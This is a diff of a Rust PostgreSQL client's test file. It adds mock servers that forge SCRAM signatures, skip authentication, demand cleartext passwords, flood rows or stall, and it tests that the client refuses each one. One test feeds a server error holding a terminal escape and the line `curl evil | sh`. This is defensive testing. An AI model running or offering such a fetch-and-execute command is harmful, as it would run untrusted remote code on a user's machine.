@@ -55,14 +55,14 @@ fn error(code: &str, message: &str) -> Vec<u8> {
 
 const ITERS: u32 = 4096;
 
-struct Verifier {
+pub(crate) struct Verifier {
     salt: Vec<u8>,
     stored_key: [u8; SHA256_LEN],
     server_key: [u8; SHA256_LEN],
 }
 
 impl Verifier {
-    fn new(password: &str, salt: Vec<u8>) -> Verifier {
+    pub(crate) fn new(password: &str, salt: Vec<u8>) -> Verifier {
         let salted = pbkdf2_sha256(password.as_bytes(), &salt, ITERS);
         let client_key = hmac_sha256(&salted, b"Client Key");
         Verifier {
@@ -73,7 +73,7 @@ impl Verifier {
     }
 }
 
-fn attr(msg: &str, key: char) -> Option<&str> {
+pub(crate) fn attr(msg: &str, key: char) -> Option<&str> {
     msg.split(',').find_map(|kv| {
         let mut it = kv.splitn(2, '=');
         let k = it.next()?;
@@ -85,7 +85,7 @@ fn attr(msg: &str, key: char) -> Option<&str> {
 
 /// One handshake: `client-first` -> `server-first`, then `client-final` ->
 /// `server-final`, or the refusal of a wrong proof.
-struct Exchange<'a> {
+pub(crate) struct Exchange<'a> {
     v: &'a Verifier,
     client_first_bare: String,
     server_first: String,
@@ -93,7 +93,7 @@ struct Exchange<'a> {
 }
 
 impl<'a> Exchange<'a> {
-    fn client_first(v: &'a Verifier, msg: &str, snonce: &str) -> (Exchange<'a>, String) {
+    pub(crate) fn client_first(v: &'a Verifier, msg: &str, snonce: &str) -> (Exchange<'a>, String) {
         let bare = msg.splitn(3, ',').nth(2).expect("a gs2 header").to_string();
         let nonce = format!("{}{snonce}", attr(&bare, 'r').expect("a client nonce"));
         let server_first = format!("r={nonce},s={},i={ITERS}", b64_encode(&v.salt));
@@ -106,7 +106,7 @@ impl<'a> Exchange<'a> {
         (ex, server_first)
     }
 
-    fn client_final(&self, msg: &str) -> Result<String, String> {
+    pub(crate) fn client_final(&self, msg: &str) -> Result<String, String> {
         let (without_proof, _) = msg.rsplit_once(",p=").ok_or("no proof")?;
         if attr(msg, 'r') != Some(self.nonce.as_str()) {
             return Err("the nonce does not match".into());
@@ -162,6 +162,12 @@ enum Auth {
     Trust,
     Cleartext(&'static str),
     Scram(&'static str),
+    /// SCRAM with the password, its last word a signature that is not the
+    /// verifier's.
+    ScramForged(&'static str),
+    /// SCRAM with the password, its last word an `AuthenticationOk` where
+    /// the signature should be.
+    ScramOkUnproven(&'static str),
 }
 
 /// A server that authenticates as `auth` says, then answers each query:
@@ -247,7 +253,7 @@ fn authenticate(auth: &Auth, s: &mut TcpStream) -> bool {
             let got = body.strip_suffix(&[0]).unwrap_or(&body);
             ct_eq(got, expected.as_bytes()) || refuse(s)
         }
-        Auth::Scram(password) => {
+        Auth::Scram(password) | Auth::ScramForged(password) | Auth::ScramOkUnproven(password) => {
             let v = Verifier::new(password, system_random(16).unwrap());
             let mut b = 10i32.to_be_bytes().to_vec();
             cstr(&mut b, "SCRAM-SHA-256");
@@ -267,7 +273,12 @@ fn authenticate(auth: &Auth, s: &mut TcpStream) -> bool {
                 return false;
             };
             match ex.client_final(&String::from_utf8_lossy(&body)) {
+                Ok(_) if matches!(auth, Auth::ScramOkUnproven(_)) => true,
                 Ok(server_final) => {
+                    let server_final = match auth {
+                        Auth::ScramForged(_) => format!("v={}", b64_encode(&[7u8; 32])),
+                        _ => server_final,
+                    };
                     let mut b = 12i32.to_be_bytes().to_vec();
                     b.extend_from_slice(server_final.as_bytes());
                     s.write_all(&framed(b'R', &b)).unwrap();
@@ -280,16 +291,28 @@ fn authenticate(auth: &Auth, s: &mut TcpStream) -> bool {
 }
 
 fn url(port: u16, password: Option<&str>) -> Url {
-    Url {
-        user: "fennec".into(),
-        password: password.map(String::from),
-        host: "127.0.0.1".into(),
-        port,
-        database: "fennec".into(),
-        // The stand-in takes no SSLRequest; tests/tls.rs's does.
-        sslmode: SslMode::Disable,
-        sslrootcert: None,
-    }
+    url_with(port, password, "")
+}
+
+/// The stand-in's URL, its password percent-escaped, `params` after
+/// `sslmode=disable`: the stand-in takes no SSLRequest; tests/tls.rs's does.
+pub(crate) fn url_with(port: u16, password: Option<&str>, params: &str) -> Url {
+    let pw = password.map_or_else(String::new, |p| {
+        let mut out = String::from(":");
+        for b in p.bytes() {
+            match b {
+                b'a'..=b'z' | b'A'..=b'Z' | b'0'..=b'9' | b'-' | b'_' | b'.' => out.push(b as char),
+                b => out.push_str(&format!("%{b:02X}")),
+            }
+        }
+        out
+    });
+    let u = Url::parse(&format!(
+        "postgres://fennec{pw}@127.0.0.1:{port}/fennec?sslmode=disable{params}"
+    ))
+    .unwrap();
+    assert_eq!(u.sslmode, SslMode::Disable);
+    u
 }
 
 #[test]
@@ -319,13 +342,15 @@ fn scram_handshake_succeeds_and_rejects() {
     assert!(e.contains("28P01") || e.contains("password"), "{e}");
 }
 
-/// A server asking SCRAM for `iterations` rounds, as one hostile, or
-/// standing in for PostgreSQL, may: whether the client's proof came back,
-/// told once the client ended or sent it.
-fn asking_server(iterations: String) -> (u16, std::sync::mpsc::Receiver<bool>) {
+/// A server whose server-first message is `first(client's nonce)`, as one
+/// hostile, or standing in for PostgreSQL, may write it: whether the
+/// client's proof came back, told once the client ended or sent it.
+fn answering_first(
+    first: impl FnOnce(&str) -> String + Send + 'static,
+) -> (u16, mpsc::Receiver<bool>) {
     let listener = TcpListener::bind("127.0.0.1:0").unwrap();
     let port = listener.local_addr().unwrap().port();
-    let (told, proof) = std::sync::mpsc::channel();
+    let (told, proof) = mpsc::channel();
     std::thread::spawn(move || {
         let (mut s, _) = listener.accept().unwrap();
         let mut len = [0u8; 4];
@@ -340,18 +365,21 @@ fn asking_server(iterations: String) -> (u16, std::sync::mpsc::Receiver<bool>) {
             return told.send(false).unwrap();
         };
         let at = body.iter().position(|&c| c == 0).unwrap() + 1 + 4;
-        let first = String::from_utf8_lossy(&body[at..]).into_owned();
-        let bare = first.splitn(3, ',').nth(2).unwrap();
+        let client_first = String::from_utf8_lossy(&body[at..]).into_owned();
+        let bare = client_first.splitn(3, ',').nth(2).unwrap();
         let cnonce = attr(bare, 'r').unwrap();
         let mut b = 11i32.to_be_bytes().to_vec();
-        b.extend_from_slice(
-            format!("r={cnonce}x,s=W22ZaJ0SNY7soEsUEjb6gQ==,i={iterations}").as_bytes(),
-        );
+        b.extend_from_slice(first(cnonce).as_bytes());
         s.write_all(&framed(b'R', &b)).unwrap();
         told.send(read_msg(&mut s).is_some_and(|(tag, _)| tag == b'p'))
             .unwrap();
     });
     (port, proof)
+}
+
+/// A server asking SCRAM for `iterations` rounds.
+fn asking_server(iterations: String) -> (u16, mpsc::Receiver<bool>) {
+    answering_first(move |cnonce| format!("r={cnonce}x,s=W22ZaJ0SNY7soEsUEjb6gQ==,i={iterations}"))
 }
 
 /// A server's iteration count past SCRAM_MAX_ITERATIONS is refused naming
@@ -361,11 +389,10 @@ fn asking_server(iterations: String) -> (u16, std::sync::mpsc::Receiver<bool>) {
 #[test]
 fn scram_refuses_iterations_past_the_bound() {
     let past = (SCRAM_MAX_ITERATIONS as u64 + 1).to_string();
-    let cases: [String; 4] = [
+    let cases: [String; 3] = [
         past.clone(),
         u32::MAX.to_string(),
         (u32::MAX as u64 + 1).to_string(),
-        "0".to_string(),
     ];
     for asked in cases {
         let (port, proof) = asking_server(asked.clone());
@@ -374,7 +401,7 @@ fn scram_refuses_iterations_past_the_bound() {
             .to_string();
         assert!(
             e.contains(&format!(
-                "is 1 to {SCRAM_MAX_ITERATIONS}, not {asked}: \
+                "is 4096 to {SCRAM_MAX_ITERATIONS}, not {asked}: \
                  set the role's password again under a lower scram_iterations"
             )),
             "{asked}: {e}"
@@ -383,10 +410,293 @@ fn scram_refuses_iterations_past_the_bound() {
     }
 }
 
+/// What a server-first message may not be, each refused with no proof sent:
+/// an iteration count under RFC 7677's floor of 4 096 (`i=1` made a proof
+/// four HMACs a guess, and went out), a nonce that is the client's alone --
+/// its own sent back, nothing of the server's after it -- and an `m`
+/// extension, which RFC 5802 says to refuse.
+/// A server-first message, written from the client's nonce.
+type First = fn(&str) -> String;
+
+/// A message's tag and body.
+type Msg = (u8, Vec<u8>);
+
 #[test]
-fn cleartext_authentication_works() {
+fn scram_refuses_a_cheap_proof_its_own_nonce_and_an_extension() {
+    let cases: [(First, &str); 4] = [
+        (
+            |n| format!("r={n}x,s=W22ZaJ0SNY7soEsUEjb6gQ==,i=4095"),
+            "not 4095: RFC 7677's floor",
+        ),
+        (
+            |n| format!("r={n}x,s=W22ZaJ0SNY7soEsUEjb6gQ==,i=1"),
+            "not 1: RFC 7677's floor",
+        ),
+        (
+            |n| format!("r={n},s=W22ZaJ0SNY7soEsUEjb6gQ==,i=4096"),
+            "invalid SCRAM",
+        ),
+        (
+            |n| format!("m=ext,r={n}x,s=W22ZaJ0SNY7soEsUEjb6gQ==,i=4096"),
+            "`m` extension",
+        ),
+    ];
+    for (first, says) in cases {
+        let (port, proof) = answering_first(first);
+        let e = Client::connect(&url(port, Some("p")))
+            .unwrap_err()
+            .to_string();
+        assert!(e.contains(says), "{says}: {e}");
+        assert!(!proof.recv().unwrap(), "a proof went out: {says}");
+    }
+}
+
+/// A stand-in asking for the password with `request` (an `R` message's
+/// body), then telling the first message the client sent back, `None` for
+/// a close.
+fn requesting(request: Vec<u8>) -> (u16, mpsc::Receiver<Option<Msg>>) {
+    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+    let port = listener.local_addr().unwrap().port();
+    let (told, got) = mpsc::channel();
+    std::thread::spawn(move || {
+        let (mut s, _) = listener.accept().unwrap();
+        let mut len = [0u8; 4];
+        s.read_exact(&mut len).unwrap();
+        let mut startup = vec![0u8; i32::from_be_bytes(len) as usize - 4];
+        s.read_exact(&mut startup).unwrap();
+        s.write_all(&framed(b'R', &request)).unwrap();
+        let _ = told.send(read_msg(&mut s));
+    });
+    (port, got)
+}
+
+/// A client holding a password gives it in clear text only where its
+/// connection string says so (`require_auth=password`): asked for it, it is
+/// refused, with libpq's words and the way to take it, and nothing goes
+/// out. Whoever stood in for the server -- under `prefer`, the default
+/// then, anyone on the path -- was answered with the password.
+#[test]
+fn a_password_goes_in_clear_only_where_the_string_says_so() {
+    let (port, got) = requesting(3i32.to_be_bytes().to_vec());
+    let e = Client::connect(&url(port, Some("open")))
+        .unwrap_err()
+        .to_string();
+    assert!(
+        e.contains("failed: the server asked for the password in clear text")
+            && e.contains("require_auth=password"),
+        "{e}"
+    );
+    let sent = got.recv().unwrap();
+    assert!(
+        !matches!(&sent, Some((b'p', _))),
+        "the password went out in clear: {sent:?}"
+    );
+
     let port = server(Auth::Cleartext("open"));
-    assert!(Client::connect(&url(port, Some("open"))).is_ok());
+    assert!(Client::connect(&url_with(port, Some("open"), "&require_auth=password")).is_ok());
+    // MD5 neither, by the default; and not spoken where allowed.
+    let (port, _) = requesting(5i32.to_be_bytes().to_vec());
+    let e = Client::connect(&url(port, Some("open")))
+        .unwrap_err()
+        .to_string();
+    assert!(e.contains("asked for an MD5 password"), "{e}");
+}
+
+/// A server that signs a client holding a password in before any exchange
+/// -- `AuthenticationOk` straight after the startup -- is refused: a
+/// stand-in for the server needs no password to do that, and the client
+/// took it, its sign-in proving nothing. `require_auth` with `none` takes
+/// it, and a client holding no password takes it as ever.
+#[test]
+fn an_authentication_ok_before_any_exchange_is_refused_where_a_password_is_held() {
+    let port = server(Auth::Trust);
+    let e = Client::connect(&url(port, Some("p")))
+        .unwrap_err()
+        .to_string();
+    assert!(
+        e.contains("the server did not complete authentication"),
+        "{e}"
+    );
+    assert!(Client::connect(&url_with(
+        port,
+        Some("p"),
+        "&require_auth=scram-sha-256,none"
+    ))
+    .is_ok());
+    assert!(Client::connect(&url(port, None)).is_ok());
+}
+
+/// SCRAM's last word is the server's signature, which only a holder of the
+/// password's verifier makes: the client refuses a stand-in that sends a
+/// wrong one, and one that signs it in with `AuthenticationOk` in its
+/// place. (`scram_rfc7677_exchange` holds the check alone; this holds the
+/// client to making it.)
+#[test]
+fn the_client_refuses_a_server_signature_it_cannot_verify() {
+    let port = server(Auth::ScramForged("p"));
+    let e = Client::connect(&url(port, Some("p")))
+        .unwrap_err()
+        .to_string();
+    assert!(e.contains("server signature could not be verified"), "{e}");
+    let port = server(Auth::ScramOkUnproven("p"));
+    let e = Client::connect(&url(port, Some("p")))
+        .unwrap_err()
+        .to_string();
+    assert!(e.contains("before SCRAM's exchange was done"), "{e}");
+}
+
+/// A password that is not ASCII goes into PBKDF2 as its UTF-8 bytes, as
+/// libpq sends one its SASLprep refuses and as a server makes the verifier
+/// of one SASLprep leaves as it is: one in NFKC, as these are.
+#[test]
+fn a_password_that_is_not_ascii_signs_in_as_its_utf8_bytes() {
+    for pw in [
+        "\u{15f}ifre-\u{e7}\u{f6}z",
+        "\u{30d1}\u{30b9}\u{30ef}\u{30fc}\u{30c9}",
+    ] {
+        let port = server(Auth::Scram(Box::leak(pw.to_string().into_boxed_str())));
+        let c = Client::connect(&url(port, Some(pw)));
+        assert!(c.is_ok(), "{pw}: {:?}", c.err());
+    }
+}
+
+/// A simple query's answer is held to 100 000 rows (`QUERY_ROWS`): past it
+/// the answer is refused in words, where every row was kept -- a null cell
+/// 24 bytes of memory for 4 of the server's.
+#[test]
+fn a_query_answer_past_its_bound_is_refused() {
+    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+    let port = listener.local_addr().unwrap().port();
+    std::thread::spawn(move || {
+        let (mut s, _) = listener.accept().unwrap();
+        let mut len = [0u8; 4];
+        s.read_exact(&mut len).unwrap();
+        let mut startup = vec![0u8; i32::from_be_bytes(len) as usize - 4];
+        s.read_exact(&mut startup).unwrap();
+        let mut out = framed(b'R', &0i32.to_be_bytes());
+        out.extend_from_slice(&framed(b'Z', b"I"));
+        s.write_all(&out).unwrap();
+        let _ = read_msg(&mut s);
+        let mut t = 1i16.to_be_bytes().to_vec();
+        cstr(&mut t, "n");
+        t.extend_from_slice(&[0u8; 6]);
+        t.extend_from_slice(&25i32.to_be_bytes());
+        t.extend_from_slice(&(-1i16).to_be_bytes());
+        t.extend_from_slice(&(-1i32).to_be_bytes());
+        t.extend_from_slice(&0i16.to_be_bytes());
+        let mut out = framed(b'T', &t);
+        let mut d = 1i16.to_be_bytes().to_vec();
+        d.extend_from_slice(&(-1i32).to_be_bytes());
+        let row = framed(b'D', &d);
+        for _ in 0..100_001 {
+            out.extend_from_slice(&row);
+        }
+        out.extend_from_slice(&framed(b'C', b"SELECT\0"));
+        out.extend_from_slice(&framed(b'Z', b"I"));
+        let _ = s.write_all(&out);
+        let mut sink = Vec::new();
+        let _ = s.read_to_end(&mut sink);
+    });
+    let mut c = Client::connect(&url(port, None)).unwrap();
+    let e = c.query("select n from t").unwrap_err().to_string();
+    assert!(e.contains("past 100000 rows"), "{e}");
+}
+
+/// A sign-in is held to `connect_timeout` whatever the server does: one
+/// that takes the connection and answers nothing, and one that answers a
+/// byte at a time, each just within a read's timeout. Each held the dial
+/// 30 s a read, the second for good -- and `fennec-server --follow` its
+/// write lock with it.
+#[test]
+fn a_sign_in_is_held_to_its_connect_timeout() {
+    for trickle in [false, true] {
+        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+        let port = listener.local_addr().unwrap().port();
+        std::thread::spawn(move || {
+            let (mut s, _) = listener.accept().unwrap();
+            let mut len = [0u8; 4];
+            s.read_exact(&mut len).unwrap();
+            let mut startup = vec![0u8; i32::from_be_bytes(len) as usize - 4];
+            s.read_exact(&mut startup).unwrap();
+            if trickle {
+                // A ParameterStatus of a mebibyte, never whole: its head,
+                // then a byte of it every 100 ms.
+                let _ = s.write_all(&[b'S', 0, 0x10, 0, 0]);
+                while s.write_all(b"x").is_ok() {
+                    std::thread::sleep(Duration::from_millis(100));
+                }
+            } else {
+                let _ = s.read_to_end(&mut Vec::new());
+            }
+        });
+        let (tx, rx) = mpsc::channel();
+        std::thread::spawn(move || {
+            let began = Instant::now();
+            let r = Client::connect(&url_with(port, None, "&connect_timeout=2"));
+            let _ = tx.send((r.map(|_| ()).map_err(|e| e.to_string()), began.elapsed()));
+        });
+        // Bounded from above, the time being the property, by what it stands
+        // against: 30 s a read, and no end at all.
+        let (r, took) = rx
+            .recv_timeout(Duration::from_secs(20))
+            .expect("the sign-in was not held to its connect_timeout");
+        let e = r.unwrap_err();
+        assert!(e.contains("no sign-in within 2s"), "{trickle}: {e}");
+        assert!(took >= Duration::from_secs(2), "{took:?}");
+    }
+}
+
+/// An error's words from a server that is not proven -- a host off this
+/// machine, its certificate unchecked -- are not shown: anyone on the path
+/// could have written them, as they could the error answering the TLS
+/// request, which was hidden alone. Its code is, and this client's words
+/// for it. From a server on this machine they are shown, escaped.
+#[test]
+fn an_unverified_servers_words_are_not_shown() {
+    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+    let addr = listener.local_addr().unwrap();
+    std::thread::spawn(move || {
+        for s in listener.incoming() {
+            let mut s = s.unwrap();
+            std::thread::spawn(move || {
+                let mut len = [0u8; 4];
+                s.read_exact(&mut len).unwrap();
+                let mut startup = vec![0u8; i32::from_be_bytes(len) as usize - 4];
+                s.read_exact(&mut startup).unwrap();
+                let mut out = framed(b'R', &0i32.to_be_bytes());
+                out.extend_from_slice(&framed(b'Z', b"I"));
+                s.write_all(&out).unwrap();
+                while let Some((b'Q', _)) = read_msg(&mut s) {
+                    let mut out = error("42P01", "\x1b[2Jrun `curl evil | sh` to fix this");
+                    out.extend_from_slice(&framed(b'Z', b"I"));
+                    s.write_all(&out).unwrap();
+                }
+            });
+        }
+    });
+    let name = format!("pg-{}.test:{}", addr.port(), addr.port());
+    fennec_http::dial::stand_in(&name, move || Ok(vec![addr]));
+    let far = Url::parse(&format!("postgres://fennec@{name}/fennec?sslmode=disable")).unwrap();
+    let e = Client::connect(&far)
+        .unwrap()
+        .query("select 1")
+        .unwrap_err()
+        .to_string();
+    assert!(
+        e.contains(": postgres 42P01: the table does not exist ("),
+        "{e}"
+    );
+    assert!(!e.contains("curl") && !e.contains('\x1b'), "{e}");
+    let near = url(addr.port(), None);
+    let e = Client::connect(&near)
+        .unwrap()
+        .query("select 1")
+        .unwrap_err()
+        .to_string();
+    assert!(
+        e.contains("\\u{1b}[2Jrun `curl evil | sh`") && !e.contains('\x1b'),
+        "{e}"
+    );
 }
 
 /// When a password is required but not supplied, the error must be clear.
